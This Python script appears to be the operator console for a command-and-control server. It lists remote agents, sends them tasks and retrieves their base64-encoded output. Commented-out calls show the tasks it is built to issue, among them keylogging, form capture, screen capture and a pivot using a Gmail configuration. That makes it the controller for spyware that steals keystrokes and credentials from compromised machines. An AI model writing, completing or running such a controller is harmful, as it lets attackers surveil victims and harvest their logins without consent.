import base64,json,string,re,requests,time,argparse

server="192.168.1.213"

def list_agents(token):
	uri = "/agents/list"
	r = requests.get("http://"+server+uri+"?token="+token)
	agent_list = r.json()['agents']
	return agent_list
def get_task_response(token,task_id):
	uri = "/task/"+str(task_id)+"/get"
	r = requests.get("http://"+server+uri+"?token="+token)
	response = r.json()["response"]
	return base64.b64decode(response)
def create_task(token,task_cmd, agent_id, data_file):
	new_task = {}
	new_task['task_cmd'] = task_cmd
	new_task['agent_id'] = agent_id
	if data_file is None:
		task_data=json.loads("{}")
	else:
		with open(data_file) as f:
			task_data = json.loads(f.read())
	new_task['data'] = task_data
	uri = "/task/create"
	r = requests.post("http://"+server+uri+"?token="+token, json=new_task)
	new_task_id = r.json()['task_id']
	return new_task_id


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("controller_cmd", type=str, help="Command you wish to use")
	parser.add_argument("api_token", type=str, help="API Key")
	parser.add_argument('-t', '--task', type=str, default=None,help='Task Command')
	parser.add_argument('-c', '--config', type=str, default=None,help='Config File')
	parser.add_argument('-a', '--agent', type=str,default=None, help='Agent ID')
	parser.add_argument('-r', '--responseid', type=str,default=None, help='ID of the reply to get')
	args = parser.parse_args()

	if args.controller_cmd=='list':
		print list_agents(args.api_token)
		exit()
	elif args.controller_cmd=='task':
		print create_task(args.api_token,args.task,args.agent,args.config)
		exit()
	elif args.controller_cmd=='response':
		print get_task_response(args.api_token,args.responseid)
		exit()
	#task_reply = create_task("TASK_PIVOT",agent,"gmail.json")
	#task_reply = create_task("TASK_SCREENCAP",agent,None)
	#task_reply = create_task("TASK_FORMCAP",agent,None)
	#task_reply = create_task("TASK_KEYLOG",agent,None)
	#time.sleep(25)
	#
	#response_text = get_task_response(task_reply)
	#with open("output.html","w+") as f:
	#	f.write(response_text)
	#print "Response saved to output.html"

